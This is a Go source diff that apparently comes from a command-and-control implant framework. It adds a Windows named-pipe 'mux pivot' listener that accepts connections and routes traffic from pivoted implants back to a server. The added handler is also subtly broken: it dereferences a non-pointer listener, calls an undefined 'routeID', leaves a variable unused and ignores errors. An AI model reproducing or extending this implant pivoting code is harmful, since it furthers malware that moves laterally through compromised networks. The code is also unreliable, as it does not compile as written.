@@ -20,7 +20,9 @@ package pivots
 
 import (
 	// {{if .Config.Debug}}
+	"fmt"
 	"log"
+	"net/url"
 	// {{end}}
 	"math/rand"
 	"net"
@@ -43,11 +45,61 @@ func StartNamedPipeListener(pipeName string) error {
 	if err != nil {
 		return err
 	}
-	go nampedPipeAcceptNewConnection(&ln)
+	go namedPipeAcceptNewConnection(&ln)
 	return nil
 }
 
-func nampedPipeAcceptNewConnection(ln *net.Listener) {
+// StartNamedPipeMuxListener - Alternative listener for named pipe mux pivots
+func StartNamedPipeMuxListener(pipeName string) error {
+	ln, err := winio.ListenPipe("\\\\.\\pipe\\"+pipeName, nil)
+	// {{if .Config.Debug}}
+	log.Printf("Listening on %s", "\\\\.\\pipe\\"+pipeName)
+	// {{end}}
+	if err != nil {
+		return err
+	}
+	go namedPipeMuxAcceptNewConnection(ln)
+	return nil
+}
+
+// namedPipeMuxAcceptNewConnection - Alternative handler for named pipe mux pivots
+func namedPipeMuxAcceptNewConnection(ln net.Listener) {
+	hostname, err := os.Hostname()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Failed to determine hostname %s", err)
+		// {{end}}
+		hostname = "."
+	}
+	namedPipe := strings.ReplaceAll((*ln).Addr().String(), ".", hostname)
+	for {
+		conn, err := (*ln).Accept()
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("Error starting named pipe listener: %s", err.Error())
+			// {{end}}
+			return
+		}
+		// {{if .Config.Debug}}
+		log.Println("Accepted a new connection")
+		// {{end}}
+
+		proto := conn.RemoteAddr().Network()
+		host := conn.RemoteAddr().String()
+		pivotURL, _ := url.Parse(fmt.Sprintf("%s://%s", proto, host))
+
+		// Instantiate new transport, and handle multiplexing, and route back
+		// the first muxed stream (used by pivoted implant to speak RPC with server)
+		transport, _ := transports.NewTransport(pivotURL)
+		transport.StartMuxPivot(conn, routeID)
+
+		// Add transport to Transports map.
+		transports.Transports.Add(transport)
+	}
+
+}
+
+func namedPipeAcceptNewConnection(ln *net.Listener) {
 	hostname, err := os.Hostname()
 	if err != nil {
 		// {{if .Config.Debug}}
